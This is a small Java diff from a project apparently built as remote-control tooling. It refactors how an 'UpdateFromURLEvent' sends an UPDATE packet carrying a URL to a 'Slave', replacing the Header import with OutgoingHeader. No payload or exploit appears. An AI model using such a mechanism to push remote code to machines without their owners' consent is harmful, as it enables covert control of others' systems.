@@ -4,8 +4,8 @@ import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.utils.IconUtils;
 import com.redpois0n.utils.Util;
 
@@ -26,7 +26,7 @@ public class UpdateFromURLEvent extends Event {
 
 	@Override
 	public void perform(Slave sl) {
-		sl.addToSendQueue(new PacketBuilder(Header.UPDATE, url));
+		sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, url));
 	}
 
 	@Override
